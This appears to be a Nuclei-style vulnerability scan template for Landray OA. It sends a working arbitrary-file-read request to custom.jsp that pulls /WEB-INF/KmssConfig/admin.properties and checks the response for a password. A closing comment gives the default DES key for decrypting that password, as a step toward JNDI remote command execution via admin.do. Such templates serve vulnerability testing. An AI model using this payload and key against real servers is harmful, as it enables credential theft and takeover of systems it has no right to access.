id: lanlingOA-admindo-code-exec

info:
  name: 蓝凌OA admin.do JNDI远程命令执行
  author: cnaq
  severity: medium
  description: 攻击者可利用任意文件读取漏洞漏洞获取敏感信息，读取配置文件得到密钥后访问 admin.do 即可利用 JNDI远程命令执行获取权限
  reference:
    - http://wiki.peiqi.tech/wiki/oa/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20admin.do%20JNDI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html
  tags: lanlingOA,code,exec
  
requests:
  - raw:
      - |
        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
        Host: {{Hostname}} 

        var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - 'password'

# 获取password后，使用 DES方法 解密，默认密钥为 kmssAdminKey